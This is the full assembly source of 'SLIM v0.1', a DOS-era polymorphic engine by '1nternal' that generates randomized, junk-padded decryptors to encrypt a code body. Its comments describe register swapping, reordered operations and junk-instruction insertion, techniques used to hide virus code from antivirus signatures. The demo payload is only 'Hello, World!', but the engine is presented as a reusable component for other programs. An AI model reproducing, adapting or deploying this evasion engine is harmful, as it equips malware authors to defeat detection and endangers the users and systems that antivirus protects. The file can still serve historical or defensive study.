; SLIM v0.1

; 1nternal's SLIM poly engine.
; CALL GenSlim

; This engine is reasonably easy to modify, adding extra junk
; routines is quite simple

;Always uses CX as counter (can be modified maybe in version 0.2)
;Always uses a LOOP instruction to loop (can be modified maybe in version 0.2)

; Uses ROL/ROR/ADD/SUB/XOR/NEG/NOT/INC/DEC Encryption
; Swaps order of initialisation operations
; Swaps order of encryption and counter operations
; Uses SI/DI/BX as index register
; Uses SI/DI/BX/DX/AX/BP as seed register
; Has some junk routines for:

;   MOV REG, IMM
;   ARITH REG,IMM (ADD/SUB/CMP/OR/AND/ADC/SBB/XOR)
;   INC/DEC
;   NEG/NOT REG
;   XCHG REG, REG
;   Single Byte Junk (STI/CLD/CMC/NOP/CLC)


Org 0100				;
MOV CX,060				;
Redo:					;
PUSH CX					;
MOV DI,Offset Endoffile   		;
	MOV SI,Offset Example		;
	MOV CX,Comend-Example		;
	XOR BP,BP			;
	Call GenSlim			;
	Call Endoffile			;
POP CX					;
Loop Redo				;
MOV AX,04c00				;
int 021					;
					; Get rid of this for use in other
Example: 				; programs.
 CALL AHEAD SHORT			;
AHEAD:       				;
 POP DX 				;
 ADD DX,09				;
 MOV AH,09				;
 INT 021				;
 RET					;
MSG:					;
 DB 'Hello, World!',0D,0A,'$'		;
COMEND:					;




;-----------------------------SLIM-------------------------------------------

;You will need about 64+Code size for decryptor.
;Plus about 100 bytes of stack or so.

;Call GENSlim:
;ES:DI is destination for Decryptor
;DS:SI is source of original code
;CX is code size in words
;BP is offset to add

;Returns:
;DS:DX=Start of decryptor
;CX=Code size + Decryptor Size
;ES:DI=End of decryptor
;SI=Offset of encryption operation
;BX=Trashed
;AX=ES:[SI]
;BP=Offset to add (Saved)

SEED    DB ?   ;Seed reg
POINT   DB ?   ;Pointer	reg
ADPOINT DB ?   ;Pointer reg as Addressable


CODESZE DW ?
ENCRYOP DW ?   ;offset within decryptor of encryption opcode
STARTOF DW ?   ;offset within decryptor of data offset

FLAG  DB ?     ;Used to determine which was loaded first
	       ;Whether or not a PUSH CS has been load
	       ;Which inits have been loaded

JunkTable:
 CLC
 CMC
 STI
 CLD
 NOP


;--------------------Generate some junk-------------------------------------


      ;This stuff is up here so the jmps aren't > 128
      
      MovImm: 	
	
	MOV AL,0B8
	CALL GENSpare
	OR AL,DL
	STOSB		;Store a MOV Spare, Imm
	MOV BX,0FFFF
	CALL RANDNUM
	MOV AX,DX
	STOSW
	RET
	
     NegNotJunk:
     	MOV AX,0D0F7h
	MOV BX,02	;Generates NEG/NOT Reg
	CALL RANDNUM
	SHL DL,4
	OR AL,DL
	CALL GENSpare
	OR AH,DL
	STOSW
	RET

     XchgJunk:
	MOV AX,0C087h
       NoSeedx1:
	CALL GENSpare
	CMP DL,b[SEED]
	JE NoSeedx1
	OR AH,DL
       NoSeedx2:	
	CALL GENSpare
	CMP DL,b[SEED]
	JE NoSeedx2
	SHL DL,3
	OR AH,DL
	STOSW
	RET     


SIMPLEJUNK:

        MOV BX,06	;0-3
	CALL RANDNUM	;1:1:1:1:2 chance for each type
	JZ SingleJunk
	CMP DL,1
	JE MovImm
	CMP DL,2
	JE NegNotJunk
	CMP DL,3
	JE XchgJunk	;Add extra junk routines here...

      ArithJunk:	;Higher probability
        
	MOV AX,0C081h
	MOV BL,08
	CALL RANDNUM
	PUSH DX
	SHL DL,3
	OR AH,DL
	CALL GENSpare
	OR AH,DL
	CMP DL,b[SEED] 	;Generates a ADD/SUB/OR/CMP/AND/SBB/ADC/XOR SPARE, IMM
	POP DX
	JNE NOTSeed	;If the seed is used, then ADC and SBB isn't used.
	CMP DL,2
	JE ArithJunk
	CMP DL,3
	JE ArithJunk
	NOTSeed:
	STOSW
	MOV BX,0FFFF
	CALL RANDNUM
	MOV AX,DX
	STOSW
	RET

     SingleJunk:	
	MOV BX,02
	CALL RANDNUM
	JZ IncDecJunk	;50% chance of loading an INC/DEC to a random reg
	MOV BX,05
	CALL RANDNUM
	MOV SI,DX
	ADD SI, OFFSET JunkTable
	MOVSB
	RET
       IncDecJunk:
	CALL GENSpare
	MOV AH,DL
	JMP RINCDEC

;Store an encryption operation
;Uses ROL/ROR/ADD/SUB/XOR/NEG/NOT/INC/DEC
       
ENCRYPTSTO:
	MOV AL,02E
	STOSB
	MOV [ENCRYOP],DI      ;Store offset of encryption operation
	MOV BX,4
	CALL RANDNUM
	JZ NEGNOTINCDECKIND	;1:1:2 Probability
	CMP DL,1
	JE ROLRORKind
	 
	ARITHKIND:      	;This one has higher probability
	  MOV AX,00001h
          MOV BX,3            ;BX=3
	  CALL RANDNUM        ;DX = 0-2
	  SHL DL,3            ;Move bits 0-2 to bits 3-5
          OR DX,DX            ;ADD = 000, SUB = 110, XOR = 101 or'd on bits 3-5
          JZ Chosen
        ADD4:
          OR DL,00100000xB    ;Add 4 over OR,ADC,SBB,AND
        Chosen:  
  	  OR AL,DL      	;Shove the opcode info in
	  OR AH,[SEED]
  	  SHL AH,3
	  OR AH,[ADPOINT]	;Shove MODRM info on
  	  STOSW
	  RET

	 ;INC/DEC/NEG/NOT kind
	 NEGNOTINCDECKind:
	  MOV  BX,2
	  CALL RANDNUM
	  JZ   NEGNOT
	  CALL RANDNUM
	  MOV  AX,000FFh
	  JMP  Already  ;INC/DEC uses 0 & 1 as additional opcode bits
	 NEGNOT:	
	  CALL RANDNUM
	  MOV  AX,000F7h
	  INC  DL
	  INC  DL       ;NEG/NOT uses 2 & 3 as additional opcode bits
	 Already:
	  SHL  DL,3     ;Chooses between INC/DEC or NEG/NOT
	  OR   AH,DL
	  OR   AH,b[ADPOINT]	
	  STOSW
	  RET
	
	ROLRORKind:
	 MOV AL,0C1h  	 
	 MOV AH,b[ADPOINT]
	 MOV BX,2
	 CALL RANDNUM
	 JZ ROLKind
	RORKind:
	 OR AH,08h
	ROLKind:
	 STOSW
 	 MOV BL,0FF
 	 CALL RANDNUM
       	 MOV AL,DL
	 STOSB
	 RET
	
;Store Slider/Incrementer
;Choose between ADD SI,2 or INC Kind

SLIDESTO:
	MOV BX,4
	CALL Randnum
	JNZ INCKIND
	MOV AX,0C083
	OR AH,[POINT]
	STOSW
	MOV AL,02
	STOSB
      	RET
      INCKIND:
	MOV BX,03
	MOV CX,BX
	CALL Randnum
       	INC DX
	
       GOALL:
	PUSH DX
	PUSH DX
	Call SimpleJunk
	POP DX
	CMP DL,CL
	JNE INCSTURN
	CALL SEDSTUF
       	JMP AndLoop
       INCSTURN:
	CALL INCSTUF
       AndLoop:	
	POP DX
	LOOP GOALL
	RET
	
		SEDSTUF:
		 MOV AH,b[SEED]
		 MOV BX,3
		 CALL RANDNUM
		 JNZ RINCDEC
		 JMP SimpleJunk ;Just add junk instead of sliding the key
		 
		INCSTUF:
		 MOV AL,040
		 OR AL,b[POINT]
		 STOSB
		 RET


;Generates a random INC/DEC to the [SWAP] register 
RINCDEC:
   MOV AL,040
   MOV BX,2
   CALL RANDNUM
   JZ INCIT
 DECIT:      ;DEC Kind
   OR AL,08h
 INCIT:      ;INC Kind
   OR AL,AH
   STOSB
   RET

;Generates a register that isn't SP or [POINT] or CX
GENSPARE:
      GetAnother:  	 
	MOV BX,06
	CALL RANDNUM 	;Generate the seed register to use
	CMP DL,1	;NOT CX
	JE GetAnother
	CMP DL,04	;NOT SP
	Je GetAnother
	CMP DL,b[POINT]	;NOT [POINT]
	JE GetAnother
	RET
	
;Store MOV SI/DI/BX/BP/DX, Seed
SEEDSTO:
	CALL SimpleJunk
	MOV 	AL,0B8
	OR 	AL,b[SEED]
	STOSB
	MOV BX,0FFFF
	Call Randnum
	MOV AX,DX
	STOSW
	RET
	
;Store MOV SI/DI/BX, Pointer
PTRSTO:
	CALL SimpleJunk
	MOV 	AL,0B8
	OR 	AL,b[POINT]
	STOSB
	MOV     [STARTOF],DI	;Save offset
	XOR	AX,AX
	TEST   	b[FLAG],00000001xb
	JZ      NOTFIRST
	DEC     AX
	DEC     AX     ;Because counter is called first
      NOTFIRST:
	STOSW
	RET
	
;Store MOV CX,Code Size
COUNTSTO:
	CALL SimpleJunk
	MOV 	AL,0B9
	STOSB
	MOV 	AX,[CODESZE]
	STOSW
	RET

	
;Simple random number generator	
RANDNUM:
        PUSH AX
         IN AX,040
         MOV DX,AX
       RANDSEED:
         XOR AX, 067C5       ;Value will be changed by next instructions
         XOR DX,AX
         MOV AH,DL
         XOR [RANDSEED+1],AX
         ADD [RANDSEED+1],AL
        XOR DX,DX
        DIV BX  ;Remainder in dx
        POP AX
        OR DL,DL  ;to save some code
	RET


;==========================MAIN GENERATION AREA==============================

GenSlim:
	

;-----------Set up and save----------------------------------	
	
	PUSH DI			;Save original offset
	PUSH BP    		;Save offset to add
	PUSH DS			;Save source segment
	PUSH DI			;Save original offfset
	PUSH SI			;Save source offset
	PUSH   CS
	POP    DS
	MOV    [CODESZE],CX ;Save Code Size
	MOV    b[FLAG],0    ;Clear flags

;---------Initialise Registers to use--------------------------	
      OopsGotDx:	
	MOV BX,8      ;0-7
	CALL RANDNUM  ;Generate Pointer Register
	OR DL,00000010xb  ;This will get us either 011, 110, 111 or 010
	CMP DL,00000010xb ;we don't want 010 (DX)
	JE OopsGotDx
	MOV b[POINT],DL	;Save it baby
	
	CMP DL,3	;BX needs doesn't follow dec by 2
	JNE SIORDI
	MOV DL,09
      SIORDI:		;Find the address version of the register
	DEC DL
	DEC DL
	MOV b[ADPOINT],DL
	
	Finished:
	
	CALL GENSpare
	MOV b[SEED],DL	
	
	
;-----------Decide order of Encryption & Slider/Incrementer-----------	
	
	MOV BX,02
	CALL RANDNUM
	JNZ Neverm
	OR b[FLAG],00000001xb
       Neverm:	
	
;------Write initialisation in random order--------------	
	
	MOV CX,3
       Next:
	PUSH CX
       Another:
	MOV BX,03h      ;0-2
	CALL RANDNUM
	JNZ Nope
       	TEST b[FLAG],00000010xb
	JNZ Another
	CALL SEEDSTO
	OR b[FLAG],00000010xb
	JMP Break
       Nope:  	
	CMP DL,1
	JNE Nope2
       	TEST b[FLAG],00000100xb	
	JNZ Another
	CALL PTRSTO
       	OR b[FLAG],00000100xb
	JMP Break
       Nope2:	
       	TEST b[FLAG],00001000xb	
	JNZ Another
	CALL COUNTSTO
       	OR b[FLAG],00001000xb
       	JMP Break
       Break:	
       	POP CX
        Loop Next

	CALL SimpleJunk
	PUSH DI 		;Will loop to this offset
	CALL SimpleJunk
	
;-----------Write Encryption and Slider/Incrementer--------------

	TEST b[FLAG],00000001xb
	JNZ Otheronefirst
	CALL ENCRYPTSTO
	Call SimpleJunk
	CALL SLIDESTO
	JMP LOOPSTO
      Otheronefirst:
	CALL SLIDESTO
	Call SimpleJunk
	CALL ENCRYPTSTO
;------------------------Store LOOP-------------------------------
LOOPSTO:
	Call SimpleJunk
	POP DX
	DEC DX
	DEC DX
	MOV AX,DI
	SUB DX,AX
	MOV AH,DL
	MOV AL,0E2
	STOSW
	Call SimpleJunk

;-------------------Call Engine to make encryption----------------
	;PUSH DI
	
	MOV AL,0CB     ;Write a retf
	STOSB
	
	MOV SI,w[STARTOF]   ;Modify the data offset
	ES ADD [SI],DI 
	
	POP SI       		;POP off source
	POP DX			;POP off original destination
	
	MOV AX,DI
	SUB AX,DX		;Calculate size of decryptor
	MOV CX,w[CODESZE]
	ADD AX,CX		;Calculate size of decryptor+code
	POP DS			;POP off source segment
	PUSH AX			;Save decryptor+code size
	PUSH DI			;Save end of decryptor
	REP MOVSW              ;Copy from DS:SI to ES:DI
	
        MOV AX,ES
	CS MOV w[OFFSET JMPOFF],AX    ;Modify immediate jmp
        CS MOV w[OFFSET JMPOFFW],DX

        DB 09A              ;Far Call
       JMPOFFW:
        DW ?
       JMPOFF:
        DW ?

;------------------Reverse Engine-------------------------------

	POP  DI       		;Restore end of decryptor
	POP  CX			;Restore decryptor + code size
	POP  BP			;POP off offset to add
	DEC  DI			;Move to the RETF
	
	CS MOV SI,w[STARTOF]
	ADD w[SI],BP
	CS MOV SI,w[ENCRYOP]
	MOV AX,w[SI]
	
	CMP AL,01
	JNE TESTSUB
	MOV b[SI],029h
	JMP REVERSED
       TESTSUB:    		;Make ADD = SUB
       	CMP AL,029
	JNE TESTINCDEC
	MOV b[SI],01h		;MAke SUB = ADD
	JMP REVERSED
       TESTINCDEC:
	CMP AL,0FFh
	JE REVIT
       TESTROLROR:
       	CMP AL,0C1h
	JNE REVERSED
       REVIT:	
	XOR b[SI+1],00001000xb	;Reverse INC/DEC or ROL/ROR
	REVERSED:

	PUSH DS
	PUSH CS			;...and this bit could be changed
	POP  DS			;by overwriting a NOP over the RETF
	CALL SingleJunk		;Overwrite the RETF	
	POP DS
	POP DX
	RET			;Make DS:DX start of decryptor
EndOffile:	
